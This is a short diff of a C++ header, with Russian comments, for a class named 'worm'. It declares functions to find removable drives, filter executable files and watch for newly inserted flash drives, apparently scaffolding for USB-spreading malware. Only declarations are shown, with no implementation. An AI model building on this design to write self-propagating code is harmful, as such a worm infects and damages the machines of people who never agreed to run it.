@@ -27,7 +27,7 @@ wstring generate_unique_suffix();
 vector<wstring> get_removable_volume_paths(); // поиск всех съемных носителей
 void filter_only_exe(vector<fs::path>& files); // фильтруем из всех файлов, только exe
 //LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam); // для обнаружения флешки после запуска червя
-
+void attach_console();
 
 wstring get_username();
 vector<wstring> get_all_volumes();
@@ -49,6 +49,13 @@ private:
 public:
 	worm(const wstring& path_to_start = get_own_path(), int iteration = 2)
 		: path_to_start(path_to_start), iteration(iteration) {};
+
+	
+
+	// Добавим статический указатель для доступа из WndProc
+	static worm* instance;
+	// Метод для запуска окна мониторинга
+	int run_device_monitor(HINSTANCE hInstance);
 
 
 	void worm_was_started();// Massage Box для отладки
